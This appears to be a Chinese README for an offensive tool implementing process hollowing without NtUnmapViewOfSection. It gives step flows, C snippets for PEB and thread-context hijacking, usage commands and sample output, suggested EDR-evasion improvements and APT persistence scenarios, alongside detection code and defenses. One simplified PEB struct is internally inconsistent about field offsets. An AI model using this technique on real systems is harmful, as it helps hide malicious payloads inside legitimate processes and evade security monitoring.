# Advanced Process Hollowing (No NtUnmapViewOfSection)

## 概述

**Advanced Process Hollowing** 是一种改进型进程镂空（Process Hollowing）技术，其核心创新在于**不使用 NtUnmapViewOfSection** API，从而大幅降低 EDR 检测风险。

**原始项目**: [itaymigdal/PichichiH0ll0wer](https://github.com/itaymigdal/PichichiH0ll0wer)

**MITRE ATT&CK**: [T1055.012 - Process Injection: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)

## 为什么要避免 NtUnmapViewOfSection？

### 传统 Process Hollowing 的问题

传统进程镂空技术的标准流程：

```
CreateProcess(挂起) → NtUnmapViewOfSection(卸载原始镜像) → VirtualAllocEx → 写入 Payload → ResumeThread
```

**致命问题**: `NtUnmapViewOfSection` 是极其可疑的 API 调用
- 正常应用几乎从不调用此 API
- EDR/AV 重点监控的可疑行为
- 出现此调用基本等同于告诉 EDR："我在搞注入！"

### 改进思路

**核心理念**: "既然卸载原始镜像会被检测，那就不卸载！"

```
CreateProcess(挂起) → VirtualAllocEx(新内存) → 写入 Payload → 修改 PEB→ImageBase → ResumeThread
```

**关键变化**:
1. **不卸载原始镜像** - 原始 exe（如 notepad.exe）依然在内存中
2. **分配新内存** - 为 payload 分配独立内存区域
3. **劫持 PEB** - 修改 PEB→ImageBase 指向新内存
4. **欺骗加载器** - Windows 加载器认为新内存才是"真正的程序"

**结果**: 原始镜像成为"僵尸"，payload 成为实际执行代码

## 技术原理

### 核心概念

**PEB (Process Environment Block)**:
- 每个进程的控制中心
- 偏移 0x10 处存储 `ImageBase` 指针
- Windows 加载器依赖 `PEB→ImageBase` 确定程序基址

**PE 重定位 (Relocation)**:
- PE 文件有"首选加载地址" (Preferred ImageBase)
- 如果无法加载到首选地址，需要修复所有绝对地址引用
- `.reloc` 节存储所有需要修复的地址位置

**线程上下文 (Thread Context)**:
- 挂起进程的主线程最初指向原始程序入口
- RCX 寄存器存储入口点地址（x64 调用约定）
- 修改 RCX 寄存器可劫持执行流

### 技术流程

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. 读取 Payload PE 文件                                         │
│    ReadPeFile(payload.exe)                                      │
│    → 解析 DOS/NT 头部                                           │
│    → 提取 ImageBase, SizeOfImage, EntryPoint                    │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 2. 创建挂起的目标进程                                           │
│    CreateProcess(target.exe, ..., CREATE_SUSPENDED, ...)       │
│    → 进程启动但主线程挂起                                       │
│    → 原始镜像已加载到内存                                       │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 3. 获取目标进程 PEB 地址                                        │
│    NtQueryInformationProcess(..., ProcessBasicInformation, ...) │
│    → PROCESS_BASIC_INFORMATION.PebBaseAddress                   │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 4. 分配新内存（尝试首选地址）                                   │
│    VirtualAllocEx(hProcess, preferredBase, imageSize, ...)      │
│    → 如果失败，使用任意地址（NULL）                             │
│    → 分配 PAGE_EXECUTE_READWRITE 权限                           │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 5. 写入 PE 内容到远程进程                                       │
│    WriteProcessMemory(..., headers, ...)                        │
│    WriteProcessMemory(..., sections, ...)                       │
│    → 复制 PE 头部                                               │
│    → 逐个复制所有节（.text, .data, .rdata 等）                 │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 6. 修改 PEB→ImageBase 指针                                      │
│    WriteProcessMemory(hProcess, PEB + 0x10, &newImageBase, ...) │
│    → 欺骗 Windows 加载器                                        │
│    → 系统认为 newImageBase 是"真正的程序"                       │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 7. 应用 PE 重定位（如果需要）                                   │
│    if (newImageBase != preferredBase) {                         │
│        ApplyRelocations(...)                                    │
│    }                                                            │
│    → 读取 .reloc 节                                             │
│    → 遍历重定位块 (BASE_RELOCATION_BLOCK)                       │
│    → 修复所有绝对地址引用                                       │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 8. 修改线程上下文（劫持入口点）                                 │
│    GetThreadContext(hThread, &ctx)                              │
│    ctx.Rcx = newImageBase + entryPoint                          │
│    SetThreadContext(hThread, &ctx)                              │
│    → RCX 寄存器指向 payload 入口点                              │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 9. 恢复线程执行                                                 │
│    ResumeThread(hThread)                                        │
│    → 线程从 payload 入口点开始执行                              │
│    → 原始镜像被忽略（"僵尸镜像"）                               │
└─────────────────────────────────────────────────────────────────┘
```

## 关键技术细节

### 1. PEB 结构与 ImageBase

**PEB 简化结构**:
```c
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;                      // +0x18
    // ...
    PVOID ImageBase;                // +0x10 ← 我们要修改的字段
    // ...
} PEB, *PPEB;
```

**关键偏移** (x64):
- `PEB + 0x10` = ImageBase

**为什么修改 ImageBase 有效**:
```c
// Windows 加载器的逻辑（简化）
PVOID GetModuleBase() {
    PEB* peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    return peb->ImageBase;  // ← 我们劫持了这里
}
```

### 2. PE 重定位原理

**为什么需要重定位**:
```c
// PE 文件在编译时假定加载到固定地址（如 0x140000000）
// 如果实际加载到不同地址（如 0x230000000），所有硬编码地址都需要调整

// 编译时（假定 ImageBase = 0x140000000）
mov rax, 0x140001234  ; 调用函数 foo

// 实际加载到 0x230000000，需要修复：
delta = 0x230000000 - 0x140000000 = 0xF0000000
新地址 = 0x140001234 + 0xF0000000 = 0x230001234
```

**重定位数据结构**:
```c
// .reloc 节的结构
typedef struct _BASE_RELOCATION_BLOCK {
    DWORD PageAddress;  // 页面 RVA
    DWORD BlockSize;    // 块大小
    // 后面跟着 entries 数组
} BASE_RELOCATION_BLOCK;

typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;   // 页内偏移（0-4095）
    WORD Type : 4;      // 重定位类型
} BASE_RELOCATION_ENTRY;

// Type 类型
#define IMAGE_REL_BASED_ABSOLUTE    0  // 跳过
#define IMAGE_REL_BASED_DIR64       10 // 64位绝对地址
```

**重定位算法**:
```c
ULONGLONG delta = newImageBase - preferredBase;

for (每个 BASE_RELOCATION_BLOCK) {
    for (每个 BASE_RELOCATION_ENTRY) {
        if (entry.Type == IMAGE_REL_BASED_DIR64) {
            // 计算需要修复的地址
            LPVOID fixupAddress = newImageBase + block.PageAddress + entry.Offset;

            // 读取原始值
            ReadProcessMemory(hProcess, fixupAddress, &originalValue, 8, NULL);

            // 应用 delta
            ULONGLONG newValue = originalValue + delta;

            // 写回
            WriteProcessMemory(hProcess, fixupAddress, &newValue, 8, NULL);
        }
    }
}
```

### 3. 线程上下文劫持

**x64 调用约定**:
```c
// Windows x64 调用约定
// RCX = 第一个参数
// RDX = 第二个参数
// R8  = 第三个参数
// R9  = 第四个参数

// 进程启动时，主线程的入口点：
// RCX = 程序入口点地址
```

**劫持机制**:
```c
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_INTEGER;
GetThreadContext(hThread, &ctx);

// 原始值: ctx.Rcx = 原始程序入口点（如 notepad.exe 入口）
// 修改为: ctx.Rcx = payload 入口点
ctx.Rcx = (DWORD64)(newImageBase + entryPoint);

SetThreadContext(hThread, &ctx);
// 线程恢复时从 payload 入口点开始执行
```

## 与传统 Process Hollowing 的对比

| 特性 | 传统 Process Hollowing | Advanced Hollowing |
|------|----------------------|-------------------|
| **卸载原始镜像** | ✅ 使用 NtUnmapViewOfSection | ❌ 不卸载，保留原始镜像 |
| **可疑 API** | NtUnmapViewOfSection (极度可疑) | 仅用常见 API |
| **EDR 检测风险** | 🔴 高 | 🟡 中 |
| **内存占用** | 低（只有 payload） | 高（原始+payload） |
| **实现复杂度** | 低 | 中（需要处理重定位） |
| **原始镜像状态** | 完全卸载 | 保留但未执行（"僵尸"） |
| **PEB 劫持** | 不需要 | ✅ 修改 PEB→ImageBase |
| **适用场景** | 已被 EDR 识别 | 绕过 EDR 监控 |

**直观理解**:

```
传统 Process Hollowing:
进程内存: [空] → [Payload]
EDR 看到: "卸载了原始程序！可疑！"

Advanced Hollowing:
进程内存: [原始程序(僵尸)] + [Payload(实际执行)]
EDR 看到: "嗯，原始程序还在，应该没问题..."
```

## 项目结构

```
11-advanced-hollowing/
├── README.md                   # 本文档
├── build.bat                   # Windows 构建脚本
├── build.sh                    # Linux/macOS 构建脚本
├── src/
│   └── advanced_hollowing.c    # 主实现（410 行）
└── build/
    └── advanced_hollowing.exe  # 编译输出（23KB）
```

## 构建和使用

### 前置要求

- **编译器**: GCC (MinGW-w64)
- **架构**: x64
- **系统**: Windows 7+
- **权限**: 管理员权限（用于进程操作）

### 构建步骤

```bash
# Windows
build.bat

# Linux/macOS (需要 MinGW 交叉编译)
bash build.sh
```

### 使用方法

```bash
cd build

# 基本用法
advanced_hollowing.exe <target.exe> <payload.exe>

# 示例 1: 劫持 notepad.exe
advanced_hollowing.exe "C:\Windows\System32\notepad.exe" payload.exe

# 示例 2: 劫持 calc.exe
advanced_hollowing.exe "C:\Windows\System32\calc.exe" payload.exe

# 示例 3: 使用自定义目标
advanced_hollowing.exe "C:\Program Files\SomeApp\app.exe" payload.exe
```

**参数说明**:
- `<target.exe>`: 合法进程路径（将被镂空的"宿主"）
- `<payload.exe>`: 你的 PE 可执行文件（实际执行的代码）

### 输出示例

```
===================================================================
Advanced Process Hollowing (No NtUnmapViewOfSection)
===================================================================

[*] Target: C:\Windows\System32\notepad.exe
[*] Payload: payload.exe

[*] Step 1: Reading payload PE file...
[+] Payload loaded: 3072 bytes

[*] Step 2: Parsing PE headers...
[+] Preferred ImageBase: 0x0000000140000000
[+] Image Size: 0x3000
[+] Entry Point RVA: 0x1000

[*] Step 3: Creating suspended target process...
[+] Process created (PID: 12345)

[*] Step 4: Retrieving PEB address...
[+] PEB Address: 0x00000012345678AB

[*] Step 5: Allocating memory in target process...
[*] Trying preferred address: 0x0000000140000000
[+] New ImageBase: 0x0000000140000000
[+] New EntryPoint: 0x0000000140001000

[*] Step 6: Copying PE headers...
[+] Headers copied

[*] Step 7: Copying PE sections...
[*] Section 0: .text (1024 bytes at 0x0000000140001000)
[*] Section 1: .rdata (512 bytes at 0x0000000140002000)
[*] Section 2: .data (512 bytes at 0x0000000140002800)
[+] All sections copied

[*] Step 8: Updating PEB->ImageBase...
[+] PEB->ImageBase updated to: 0x0000000140000000

[*] Step 9: Applying relocations...
[+] Loaded at preferred address, no relocation needed

[*] Step 10: Updating thread context (RCX register)...
[*] Original RCX: 0x00007FF712340000
[*] New RCX (EntryPoint): 0x0000000140001000
[+] Thread context updated

[*] Step 11: Resuming thread...
[+] Thread resumed

===================================================================
[+] Advanced Hollowing completed successfully!
===================================================================

[*] Press Enter to exit...
```

## 技术限制

### 1. 内存开销

- **问题**: 原始镜像 + Payload 同时存在内存
- **影响**: 内存占用约为 payload 的 2-3 倍
- **示例**: 10MB payload → 20-30MB 实际占用

### 2. 架构依赖

- **仅支持 x64**
- PEB 偏移在不同架构下不同:
  - x64: `PEB + 0x10` = ImageBase
  - x86: `PEB + 0x08` = ImageBase

### 3. PE 格式限制

- **必须是有效的 PE 可执行文件**
- 需要包含:
  - 有效的 DOS/NT 头部
  - 正确的节表
  - 如果加载地址不同，需要 `.reloc` 节

### 4. 重定位要求

**无 .reloc 节的风险**:
```c
// 某些编译器选项会移除 .reloc 节（如 /FIXED 链接器选项）
// 这种 PE 只能加载到首选地址

if (newImageBase != preferredBase && !hasRelocSection) {
    // 注入失败！
    printf("[-] Cannot relocate PE without .reloc section\n");
}
```

**如何生成带重定位的 PE**:
```bash
# GCC (默认生成 .reloc)
gcc -o payload.exe payload.c

# MSVC (确保包含重定位)
cl /c payload.c
link payload.obj /DYNAMICBASE  # ← 生成 .reloc
```

## 检测与防御

### 检测方法

**1. 内存异常检测**
```c
// 检测："僵尸镜像" + 活跃镜像并存
EnumProcessModulesEx(hProcess, modules, sizeof(modules), &needed, LIST_MODULES_ALL);

for (each module) {
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQueryEx(hProcess, module.base, &mbi, sizeof(mbi));

    if (mbi.State == MEM_COMMIT && mbi.Protect == PAGE_EXECUTE_READWRITE) {
        // 可疑：大块 RWX 内存
        if (!IsInModuleList(mbi.BaseAddress, modules)) {
            Alert("Suspicious executable memory outside modules!");
        }
    }
}
```

**2. PEB 完整性验证**
```c
// 检测 PEB→ImageBase 是否指向合法模块
PVOID imageBase = GetPebImageBase();
PVOID expectedBase = GetModuleHandle(NULL);

if (imageBase != expectedBase) {
    Alert("PEB->ImageBase has been tampered!");
}
```

**3. 线程上下文异常**
```c
// 检测线程入口点是否在合法模块范围内
CONTEXT ctx;
GetThreadContext(hThread, &ctx);

if (!IsAddressInModule(ctx.Rcx)) {
    Alert("Thread entry point outside valid modules!");
}
```

**4. 行为监控**
```
可疑行为序列：
1. CreateProcess(CREATE_SUSPENDED)
2. NtQueryInformationProcess(ProcessBasicInformation)
3. WriteProcessMemory(PEB 区域)
4. WriteProcessMemory(大量数据)
5. SetThreadContext
6. ResumeThread

→ 符合 Process Hollowing 特征
```

### 防御建议

**对于 EDR/AV**:
- 监控 PEB 区域的写入操作
- 检测挂起进程的线程上下文修改
- 扫描非模块区域的可执行内存
- 关联多个可疑 API 的调用序列

**对于管理员**:
- 启用 HVCI (Hypervisor-protected Code Integrity)
- 使用 Windows Defender Application Guard
- 部署 EDR 解决方案
- 限制不必要进程的 PROCESS_ALL_ACCESS 权限

**对于开发者**:
- 使用 Process Mitigation Policies:
  ```c
  SetProcessMitigationPolicy(ProcessSignaturePolicy, ...);
  ```
- 启用 CFG (Control Flow Guard)
- 实施运行时完整性检查:
  ```c
  void CheckIntegrity() {
      PVOID currentBase = GetPebImageBase();
      PVOID expectedBase = GetModuleHandle(NULL);
      if (currentBase != expectedBase) {
          TerminateProcess(GetCurrentProcess(), 0);
      }
  }
  ```

## 改进方向

### 1. 更隐蔽的内存保护

**当前实现**:
```c
VirtualAllocEx(hProcess, ..., PAGE_EXECUTE_READWRITE);  // RWX = 可疑
```

**改进方案**:
```c
// 分阶段修改保护属性
LPVOID mem = VirtualAllocEx(hProcess, ..., PAGE_READWRITE);
WriteProcessMemory(hProcess, mem, payload, payloadSize, NULL);
VirtualProtectEx(hProcess, mem, payloadSize, PAGE_EXECUTE_READ, &oldProtect);
```

### 2. 清理"僵尸镜像"

**问题**: 原始镜像占用内存且可被检测

**改进方案**:
```c
// 在 payload 启动后，用 payload 代码主动卸载僵尸镜像
// (需要 payload 配合)
void Payload_Main() {
    // 延迟执行，确保进程已稳定
    Sleep(1000);

    // 获取僵尸镜像基址（扫描内存）
    PVOID zombieBase = FindZombieImage();
    if (zombieBase) {
        NtUnmapViewOfSection(GetCurrentProcess(), zombieBase);
    }

    // 执行正常 payload 逻辑
    RunPayload();
}
```

### 3. 模块伪装

**问题**: Payload 内存不在合法模块列表中

**改进方案**:
```c
// 劫持已加载的合法 DLL 的内存空间
// 1. 枚举目标进程的 DLL
// 2. 选择大小合适的 DLL（如 kernel32.dll 的.data 节）
// 3. 在该节中写入 shellcode stub
// 4. 将完整 payload 写入新分配的内存
// 5. Stub 跳转到 payload
```

### 4. 反射式加载

**当前实现**: 依赖 Windows 加载器（通过 PEB 劫持）

**改进方案**: 完全手动加载 PE（反射式 DLL 注入风格）
```c
// 不依赖 PEB，手动处理：
// - 导入表 (IAT)
// - 重定位
// - TLS 回调
// - 异常处理
```

## 实战案例

### APT 组织使用场景

**横向移动**:
```
1. 攻击者获得域控凭证
2. 使用 PsExec 在目标机器启动进程
3. 注入后门 payload（使用 Advanced Hollowing）
4. Payload 伪装成合法进程（如 svchost.exe）
5. 建立 C2 连接
```

**持久化**:
```
1. 注入到系统关键进程（如 explorer.exe）
2. 修改注册表添加自启动
3. 每次启动时 hollowing 相同目标
4. EDR 难以区分合法进程和被劫持进程
```

## 相关技术

- **[Traditional Process Hollowing](../01-process-hollowing/)** - 使用 NtUnmapViewOfSection 的传统方法
- **[Kernel Callback Table Injection](../10-kernel-callback-table/)** - 另一种 PEB 劫持技术
- **[Early Cascade Injection](../09-early-cascade/)** - 利用 LdrInitializeThunk 的早期注入

## Credits

- **itaymigdal** - PichichiH0ll0wer 项目作者
- **hasherezade** - libpeconv 和 PE 加载研究
- **OffensiveNim** - Nim 实现参考

## 参考资料

### 技术文章
- [PichichiH0ll0wer Repository](https://github.com/itaymigdal/PichichiH0ll0wer)
- [Process Hollowing - MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/012/)
- [PE Format - Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)

### PE 重定位
- [PE Base Relocations](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#base-relocations)
- [Hasherezade's PE Manual Mapping](https://github.com/hasherezade/libpeconv/tree/master/run_pe)

## 免责声明

此代码仅用于教育和防御性安全研究目的。不得用于未经授权的系统访问或恶意活动。使用者需对自己的行为负责。
